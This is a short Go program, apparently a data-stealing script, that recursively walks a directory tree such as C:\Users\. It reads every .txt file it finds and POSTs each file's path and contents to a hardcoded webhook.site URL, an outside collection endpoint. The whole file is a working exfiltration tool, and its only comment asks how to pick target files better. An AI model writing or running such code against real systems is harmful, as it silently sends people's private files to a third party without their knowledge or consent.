package main

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
)

//usage: go run getFiles.go /
//Windows usage: .\fileSearch.exe C:\Users\

var regexes = []*regexp.Regexp{
	regexp.MustCompile(`\.txt$`), //how it decides to pick files should be improved, which regexp option to use?
}

func main() {

	root := os.Args[1]
	if err := filepath.Walk(root, walkFn); err != nil {
		log.Panicln(err)
	}

}

func walkFn(path string, f os.FileInfo, err error) error {
	for _, r := range regexes {
		if r.MatchString(path) {
			fmt.Printf("%s\n", path)
			readAFile(path)

		}
	}
	return nil
}

//Source: https://gobyexample.com/reading-files
func readAFile(path string) {
	dat, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}
	fmt.Print(string(dat))
	httpPoster(string(dat), path)

}

func httpPoster(fileData string, filename string) {
	data := []byte(filename + ":" + fileData)

	req, err := http.NewRequest("POST", "https://webhook.site/27227c6f-b632-4b50-ae7e-a38b18629b2c", bytes.NewBuffer(data))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}

	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

}
